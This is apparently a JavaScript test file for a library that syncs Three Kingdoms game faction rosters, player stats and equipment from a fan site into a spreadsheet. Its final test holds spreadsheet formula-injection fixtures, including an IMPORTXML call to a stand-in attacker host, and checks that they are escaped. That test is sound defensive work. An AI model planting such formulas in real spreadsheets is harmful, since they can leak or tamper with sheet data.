"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const {
  buildGamcomSnapshots,
  buildReferenceRows,
  mergeGamcomMembers,
  parseGamcomFactionPayload,
} = require("../lib/samguk-gamcom-sync");

const COLLECTED_AT = "2026-08-03T03:04:05.000Z";
const SOURCE_URL = "https://gamcom-3kingdom.vercel.app/factions/%EC%B4%89";

function rawGamcomRow(index, overrides = {}) {
  return {
    nation: "촉나라",
    crew_name: `크루${index}`,
    nickname: `플레이어${String(index).padStart(3, "0")}`,
    job: "천강",
    horse: "백룡마",
    horse_level: 1,
    weapon: 2,
    helmet: 3,
    armor: 4,
    shoes: 5,
    stat_strength: 10,
    stat_agility: 11,
    stat_vitality: 12,
    stat_intelligence: 13,
    ...overrides,
  };
}

function rawGamcomRows(count = 30, overrides = {}) {
  return Array.from({ length: count }, (_value, index) => rawGamcomRow(index + 1, overrides));
}

function rscPayload(rows) {
  return `7:["$","section",null,{"data":{"rows":${JSON.stringify(rows)},"emptySlotCount":0}}]`;
}

function currentMember(index, overrides = {}) {
  return {
    playerId: `P${String(index).padStart(3, "0")}`,
    soopId: `bj_${String(index).padStart(3, "0")}`,
    name: `플레이어${String(index).padStart(3, "0")}`,
    nation: "촉나라",
    crew: `크루${index}`,
    job: "천강",
    horse: "백룡마",
    horseLevel: 1,
    weapon: 2,
    helmet: 3,
    armor: 4,
    shoes: 5,
    strength: 10,
    agility: 11,
    vitality: 12,
    intelligence: 13,
    maxHealth: 1575,
    attackPower: 110,
    ...overrides,
  };
}

function externalMember(index, overrides = {}) {
  return {
    nation: "촉나라",
    crewName: `크루${index}`,
    nickname: `플레이어${String(index).padStart(3, "0")}`,
    job: "천강",
    horse: "백룡마",
    horseLevel: 1,
    weapon: 2,
    helmet: 3,
    armor: 4,
    shoes: 5,
    strength: 10,
    agility: 11,
    vitality: 12,
    intelligence: 13,
    sourceUrl: SOURCE_URL,
    ...overrides,
  };
}

function completeRoster() {
  return {
    current: Array.from({ length: 90 }, (_value, index) => currentMember(index + 1)),
    external: Array.from({ length: 90 }, (_value, index) => externalMember(index + 1)),
  };
}

test("Gamcom RSC text에서 30명 세력 데이터를 정규화한다", () => {
  const rows = parseGamcomFactionPayload(rscPayload(rawGamcomRows()), {
    expectedNation: "촉나라",
    expectedCount: 30,
  });

  assert.equal(rows.length, 30);
  assert.deepEqual(rows[0], {
    nation: "촉나라",
    crewName: "크루1",
    nickname: "플레이어001",
    job: "천강",
    horse: "백룡마",
    horseLevel: 1,
    weapon: 2,
    helmet: 3,
    armor: 4,
    shoes: 5,
    strength: 10,
    agility: 11,
    vitality: 12,
    intelligence: 13,
  });
});

test("HTML의 self.__next_f.push 조각에서도 RSC rows를 추출한다", () => {
  const rows = rawGamcomRows();
  const html = [
    "<!doctype html><html><body>",
    `<script>self.__next_f.push(${JSON.stringify([1, "0:{\"buildId\":\"test\"}"])})</script>`,
    `<script>self.__next_f.push(${JSON.stringify([1, rscPayload(rows)])})</script>`,
    "</body></html>",
  ].join("");

  const parsed = parseGamcomFactionPayload(html, {
    expectedNation: "촉나라",
    expectedCount: 30,
  });

  assert.equal(parsed.length, 30);
  assert.equal(parsed.at(-1).nickname, "플레이어030");
});

test("세력 페이지는 정확한 인원수, 고유 닉네임, 동일 국가를 강제한다", () => {
  assert.throws(
    () => parseGamcomFactionPayload(rscPayload(rawGamcomRows(29)), {
      expectedNation: "촉나라",
      expectedCount: 30,
    }),
    /30|인원|count/i,
  );

  const duplicate = rawGamcomRows();
  duplicate[29].nickname = duplicate[0].nickname;
  assert.throws(
    () => parseGamcomFactionPayload(rscPayload(duplicate), {
      expectedNation: "촉나라",
      expectedCount: 30,
    }),
    /닉네임|중복|duplicate/i,
  );

  const wrongNation = rawGamcomRows();
  wrongNation[5].nation = "위나라";
  assert.throws(
    () => parseGamcomFactionPayload(rscPayload(wrongNation), {
      expectedNation: "촉나라",
      expectedCount: 30,
    }),
    /국가|세력|nation/i,
  );

  const implausibleStat = rawGamcomRows();
  implausibleStat[0].stat_strength = 1001;
  assert.throws(
    () => parseGamcomFactionPayload(rscPayload(implausibleStat), {
      expectedNation: "촉나라",
      expectedCount: 30,
    }),
    /strength|숫자|number/i,
  );
});

test("숫자는 현재값과 외부값 중 max를 쓰고 0도 관측값으로 적용한다", () => {
  const { current, external } = completeRoster();
  current[0] = currentMember(1, {
    crew: "우리크루",
    job: "천강",
    horse: "",
    horseLevel: null,
    weapon: 9,
    helmet: 0,
    armor: 4,
    shoes: null,
    strength: 130,
    agility: 0,
    vitality: 33,
    intelligence: null,
  });
  external[0] = externalMember(1, {
    crewName: "외부크루",
    job: "창수",
    horse: "적토마",
    horseLevel: 0,
    weapon: 7,
    helmet: 5,
    armor: 4,
    shoes: 0,
    strength: 145,
    agility: 0,
    vitality: 20,
    intelligence: 0,
  });
  const currentBefore = structuredClone(current);
  const externalBefore = structuredClone(external);

  const result = mergeGamcomMembers(current, external, { collectedAt: COLLECTED_AT });
  const merged = result.members[0];

  assert.equal(result.matchedCount, 90);
  assert.equal(result.changedCount, 6);
  assert.deepEqual({
    crew: merged.crew,
    job: merged.job,
    horse: merged.horse,
    horseLevel: merged.horseLevel,
    weapon: merged.weapon,
    helmet: merged.helmet,
    armor: merged.armor,
    shoes: merged.shoes,
    strength: merged.strength,
    agility: merged.agility,
    vitality: merged.vitality,
    intelligence: merged.intelligence,
  }, {
    crew: "우리크루",
    job: "천강",
    horse: "적토마",
    horseLevel: 0,
    weapon: 9,
    helmet: 5,
    armor: 4,
    shoes: 0,
    strength: 145,
    agility: 0,
    vitality: 33,
    intelligence: 0,
  });
  assert.deepEqual(
    new Set(result.referenceRows[0].changedFields),
    new Set(["horse", "horseLevel", "helmet", "shoes", "strength", "intelligence"]),
  );
  assert.deepEqual(
    new Set(result.conflicts.map(conflict => conflict.field)),
    new Set(["crew", "job", "weapon", "vitality"]),
  );
  assert.equal(result.referenceRows[0].playerId, "P001");
  assert.equal(result.referenceRows[0].soopId, "bj_001");
  assert.equal(result.referenceRows[0].sourceUrl, SOURCE_URL);
  assert.equal(result.referenceRows[0].collectedAt, COLLECTED_AT);
  assert.equal(typeof result.referenceRows[0].comparison, "string");
  assert.notEqual(result.referenceRows[0].comparison, "");
  assert.deepEqual(current, currentBefore, "현재 현황 원본을 변경하지 않아야 한다");
  assert.deepEqual(external, externalBefore, "외부 원본을 변경하지 않아야 한다");
});

test("90명 중 누락되거나 닉네임이 매칭되지 않으면 부분 병합하지 않는다", () => {
  const { current, external } = completeRoster();

  assert.throws(
    () => mergeGamcomMembers(current, external.slice(0, 89), { collectedAt: COLLECTED_AT }),
    /90|누락|매칭|match/i,
  );

  const unmatched = structuredClone(external);
  unmatched[42].nickname = "등록되지않은닉네임";
  assert.throws(
    () => mergeGamcomMembers(current, unmatched, { collectedAt: COLLECTED_AT }),
    /닉네임|누락|매칭|match/i,
  );
});

test("변경된 최댓값만 시트+Gamcom 기준값 스냅샷으로 만든다", () => {
  const { current, external } = completeRoster();
  external[0] = externalMember(1, { weapon: 9 });

  const result = mergeGamcomMembers(current, external, { collectedAt: COLLECTED_AT });
  const snapshots = buildGamcomSnapshots(result, {
    sheetUrl: "https://docs.google.com/spreadsheets/d/test/edit",
    collectedAt: COLLECTED_AT,
  });

  assert.equal(snapshots.length, 1);
  assert.equal(snapshots[0].playerId, "P001");
  assert.equal(snapshots[0].fields.weapon, 9);
  assert.equal(snapshots[0].fields.maxHealth, undefined);
  assert.equal(snapshots[0].fields.attackPower, undefined);
  assert.deepEqual(snapshots[0].sourceTypes, ["sheet", "gamcom"]);
  assert.equal(snapshots[0].sourceCount, 2);
  assert.equal(snapshots[0].verification, "gamcom-max");
});

test("참가자 텍스트 보완만 있으면 값 없는 관측 스냅샷을 만들지 않는다", () => {
  const { current, external } = completeRoster();
  current[0] = currentMember(1, { crew: "", job: "" });
  external[0] = externalMember(1, { crewName: "보완크루", job: "보완직업" });

  const result = mergeGamcomMembers(current, external, { collectedAt: COLLECTED_AT });
  const snapshots = buildGamcomSnapshots(result, {
    sheetUrl: "https://docs.google.com/spreadsheets/d/test/edit",
    collectedAt: COLLECTED_AT,
  });

  assert.deepEqual(result.referenceRows[0].changedFields, ["crew", "job"]);
  assert.equal(snapshots.length, 0);
});

test("같은 최고값 스냅샷은 수집시각이 달라도 같은 observationId를 사용한다", () => {
  const { current, external } = completeRoster();
  external[0] = externalMember(1, { weapon: 9 });
  const result = mergeGamcomMembers(current, external, { collectedAt: COLLECTED_AT });
  const options = { sheetUrl: "https://docs.google.com/spreadsheets/d/test/edit" };

  const first = buildGamcomSnapshots(result, { ...options, collectedAt: COLLECTED_AT })[0];
  const second = buildGamcomSnapshots(result, { ...options, collectedAt: "2026-08-03T04:04:05.000Z" })[0];

  assert.equal(first.observationId, second.observationId);
  assert.equal(first.evidenceHash, second.evidenceHash);
  assert.notEqual(first.observedAt, second.observedAt);
});

test("스냅샷 수집시각이 잘못되면 명시적인 설정 오류를 반환한다", () => {
  const { current, external } = completeRoster();
  external[0] = externalMember(1, { weapon: 9 });
  const result = mergeGamcomMembers(current, external, { collectedAt: COLLECTED_AT });

  assert.throws(
    () => buildGamcomSnapshots(result, { sheetUrl: "https://example.com", collectedAt: "not-a-date" }),
    error => error?.code === "invalid_config",
  );
});

test("시트 참고행의 모든 수식 시작 문자열을 literal로 이스케이프한다", () => {
  const input = {
    referenceRows: [{
      playerId: "P001",
      soopId: "bj_001",
      nickname: "=IMPORTXML(\"https://evil.invalid\")",
      nation: "+CMD",
      crewName: " \t=SUM(1,1)",
      job: "@SUM(1,1)",
      horse: "-1+1",
      horseLevel: 0,
      weapon: 1,
      helmet: 2,
      armor: 3,
      shoes: 4,
      strength: 5,
      agility: 6,
      vitality: 7,
      intelligence: 8,
      sourceUrl: SOURCE_URL,
      collectedAt: COLLECTED_AT,
      comparison: "updated",
      changedFields: ["weapon"],
    }],
  };
  const before = structuredClone(input);
  const [row] = buildReferenceRows(input);

  assert.equal(row.nickname, "'=IMPORTXML(\"https://evil.invalid\")");
  assert.equal(row.nation, "'+CMD");
  assert.equal(row.crewName, "' \t=SUM(1,1)");
  assert.equal(row.job, "'@SUM(1,1)");
  assert.equal(row.horse, "'-1+1");
  assert.equal(row.sourceUrl, SOURCE_URL);
  assert.deepEqual(input, before, "참고행 원본을 변경하지 않아야 한다");
});
